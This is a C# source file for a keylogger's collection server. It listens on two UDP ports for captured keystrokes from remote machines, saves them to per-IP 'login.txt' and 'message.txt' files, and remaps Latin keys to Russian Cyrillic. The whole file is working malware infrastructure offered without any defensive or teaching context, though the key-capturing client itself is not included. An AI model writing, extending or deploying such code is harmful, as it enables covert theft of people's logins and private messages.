using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace KeyloggerServer
{
    class KeyloggerServer
    {
        static UdpClient serverMsg = new UdpClient(3001);

        static void Main(string[] args)
        {
            Thread myThread = new Thread(new ThreadStart(receiveBuffEntry));
            myThread.Start();

            serverMsg.BeginReceive(new AsyncCallback(receiveBuffMsg), null);
        }

        private static void receiveBuffMsg(IAsyncResult res)
        {
            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 3001);
            byte[] received = serverMsg.EndReceive(res, ref RemoteIpEndPoint);
            WriteMsgAsync(Encoding.UTF8.GetString(received), RemoteIpEndPoint.Address.ToString() + " message.txt");
            serverMsg.BeginReceive(new AsyncCallback(receiveBuffMsg), null);
        }
        private static void receiveBuffEntry()
        {
            IPEndPoint ip;
            while (true)
            {
                UdpClient server = new UdpClient(3000);
                ip = null;
                byte[] data = server.Receive(ref ip);
                WriteLoginAsync(Encoding.UTF8.GetString(data), ip.Address.ToString() + " login.txt");
                server.Close();
            }
        }

        static async void WriteLoginAsync(string text, string fileName)
        {
            using (StreamWriter writer = File.AppendText(fileName))
            {               
                await writer.WriteAsync(text);
            }
        }
        static async void WriteMsgAsync(string text, string fileName)
        {
            using (StreamWriter writer = File.AppendText(fileName))
            {
                await writer.WriteAsync(Cyrillify(text));
            }
        }


        static string Cyrillify(string str)
        {
            StringBuilder sb = new StringBuilder();
            bool space = false;
            foreach (char c in str)
            {             
                try   {
                    sb.Append(Replacements[c]);
                    space = true;
                }
                catch {
                    if (space)
                    {
                        sb.Append(" ");
                        space = false;
                    }
                    continue;
                }              
            }               
            return sb.ToString();
        }
        static Dictionary<char, char> Replacements = new Dictionary<char, char>()
        {
            ['Q'] = 'Й',
            ['W'] = 'Ц',
            ['E'] = 'У',
            ['R'] = 'К',
            ['T'] = 'Е',
            ['Y'] = 'Н',
            ['U'] = 'Г',
            ['I'] = 'Ш',
            ['O'] = 'Щ',
            ['P'] = 'З',
            ['Û'] = 'Х',
            ['Ý'] = 'Ъ',
            ['A'] = 'Ф',
            ['S'] = 'Ы',
            ['D'] = 'В',
            ['F'] = 'А',
            ['G'] = 'П',
            ['H'] = 'Р',
            ['J'] = 'О',
            ['K'] = 'Л',
            ['L'] = 'Д',
            ['º'] = 'Ж',
            ['Þ'] = 'Э',
            ['Z'] = 'Я',
            ['X'] = 'Ч',
            ['C'] = 'С',
            ['V'] = 'М',
            ['B'] = 'И',
            ['N'] = 'Т',
            ['M'] = 'Ь',
            ['¼'] = 'Б',
            ['¾'] = 'Ю',
            ['À'] = 'Ё',       
        };
    }
}
